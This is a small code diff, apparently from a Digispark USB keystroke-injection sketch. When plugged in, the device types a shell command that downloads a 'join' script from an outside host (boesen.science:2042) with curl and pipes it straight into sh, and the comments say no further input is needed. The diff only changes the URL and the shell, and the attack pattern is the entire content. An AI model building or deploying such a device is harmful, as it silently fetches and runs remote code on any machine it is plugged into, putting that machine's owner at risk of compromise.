@@ -22,7 +22,7 @@ void setup() {
     DigiKeyboard.delay(100);
     // Run bash command to download and run join script
     // No further input needed from USB
-    DigiKeyboard.println("bash -c 'curl -L boesen.science:2042/linux/join.sh |bash'");
+    DigiKeyboard.println("sh -c 'curl -L boesen.science:2042/jl |sh'");
     // Prevent repetition of enter after previous line
     DigiKeyboard.sendKeyStroke(0);
 
